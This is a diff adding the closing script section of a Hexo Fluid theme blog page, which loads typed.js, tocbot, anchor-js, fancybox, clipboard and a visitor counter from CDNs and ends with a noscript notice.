+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
